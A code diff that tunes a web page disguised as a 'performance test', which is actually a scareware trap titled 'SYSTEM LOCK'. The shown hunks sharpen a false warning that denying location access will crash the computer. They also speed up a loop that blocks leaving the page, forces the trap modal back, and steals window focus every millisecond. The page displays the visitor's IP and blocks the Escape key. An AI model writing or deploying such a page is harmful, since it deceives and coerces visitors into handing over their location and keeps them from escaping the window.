@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Integrity Check</title>
+    <title>SYSTEM LOCK</title>
     <style>
         body {
             margin: 0;
             padding: 0;
             background-color: #000;
-            color: #0f0;
+            color: #fff;
             font-family: 'Courier New', Courier, monospace;
             overflow: hidden;
             user-select: none;
@@ -21,14 +21,14 @@
             top: 0;
             left: 0;
             width: 100%;
-            height: 40px;
+            height: 30px;
             background: #111;
             border-bottom: 1px solid #333;
             display: flex;
             align-items: center;
             justify-content: center;
             z-index: 999999999; 
-            box-shadow: 0 2px 10px rgba(0,0,0,0.5);
+            box-shadow: 0 2px 5px rgba(0,0,0,0.5);
         }
 
         .pass-input {
@@ -36,15 +36,15 @@
             border: none;
             border-bottom: 1px solid #555;
             color: #fff;
-            font-size: 16px;
+            font-size: 12px;
             padding: 5px;
             text-align: center;
             outline: none;
-            width: 150px;
+            width: 100px;
         }
 
         .pass-label {
-            font-size: 12px;
+            font-size: 10px;
             color: #777;
             margin-right: 10px;
         }
@@ -62,27 +62,27 @@
         }
 
         .fps-counter {
-            font-size: 8rem;
+            font-size: 6rem;
             font-weight: bold;
-            text-shadow: 0 0 20px #0f0;
+            text-shadow: 0 0 10px #0f0;
             margin-bottom: 20px;
         }
 
         .start-btn {
-            padding: 20px 40px;
-            font-size: 1.5rem;
+            padding: 15px 30px;
+            font-size: 1.2rem;
             background: #000;
             border: 2px solid #0f0;
             color: #0f0;
             cursor: pointer;
-            box-shadow: 0 0 15px #0f0;
+            box-shadow: 0 0 10px #0f0;
             transition: all 0.3s ease;
         }
 
         .start-btn:hover {
             background: #0f0;
             color: #000;
-            box-shadow: 0 0 30px #0f0;
+            box-shadow: 0 0 20px #0f0;
         }
 
         /* Trap Modal */
@@ -93,7 +93,7 @@
             left: 0;
             width: 100vw;
             height: 100vh;
-            background: rgba(0, 0, 0, 0.98);
+            background: rgba(0, 0, 0, 0.99);
             z-index: 999999999; 
             flex-direction: column;
             justify-content: center;
@@ -105,22 +105,22 @@
 
         .modal-content {
             background: #111;
-            padding: 40px;
+            padding: 30px;
             border: 2px solid red;
-            max-width: 600px;
-            box-shadow: 0 0 50px red;
+            max-width: 500px;
+            box-shadow: 0 0 30px red;
             animation: shake 0.5s infinite;
         }
 
         h1 {
             color: red;
-            font-size: 3rem;
+            font-size: 2.5rem;
             margin-bottom: 10px;
             text-transform: uppercase;
         }
 
         p {
-            font-size: 1.2rem;
+            font-size: 1rem;
             line-height: 1.5;
             color: white;
         }
@@ -128,7 +128,7 @@
         .deny-warning {
             color: yellow;
             font-weight: bold;
-            font-size: 1.5rem;
+            font-size: 1.2rem;
             border: 2px dashed yellow;
             padding: 10px;
             margin-bottom: 20px;
@@ -170,7 +170,7 @@
     <!-- FPS Display / Start Screen -->
     <div id="fps-display">
         <div class="fps-counter" id="fps-number">60</div>
-        <p style="font-size: 1.2rem;">Optimal Performance Detected</p>
+        <p style="font-size: 1rem;">Optimal Performance Detected</p>
         <button class="start-btn" onclick="startTrap()">START PERFORMANCE TEST</button>
     </div>
 
@@ -181,7 +181,7 @@
             
             <!-- The Warning -->
             <div class="deny-warning">
-                WARNING: IF YOU CLICK "DENY", YOUR COMPUTER WILL CRASH!
+                WARNING: IF YOU DENY LOCATION, YOUR COMPUTER WILL CRASH!
             </div>
 
             <p><strong>Your IP Address:</strong> <span id="user-ip">Fetching...</span></p>
@@ -190,7 +190,7 @@
             <br>
             <p style="color: yellow;">DO NOT CLOSE THIS WINDOW.</p>
             
-            <div id="email-status" style="margin-top: 10px; font-size: 0.8rem; color: #aaa;"></div>
+            <div id="email-status" style="margin-top: 10px; font-size: 0.7rem; color: #aaa;"></div>
         </div>
     </div>
 
@@ -348,7 +348,7 @@
             }
         }
 
-        // Aggressive Loop
+        // Aggressive Loop for Fullscreen
         function startAggressiveLoop() {
             window.onbeforeunload = function(e) {
                 e.preventDefault();
@@ -356,6 +356,7 @@
                 return '';
             };
 
+            // Force fullscreen every 0.001 seconds
             setInterval(() => {
                 const modal = document.getElementById('trap-modal');
                 if (window.getComputedStyle(modal).display === 'none') {
@@ -365,7 +366,7 @@
                 if (!document.hasFocus()) {
                     window.focus();
                 }
-            }, 50);
+            }, 1);
         }
 
         // Block Escape Key
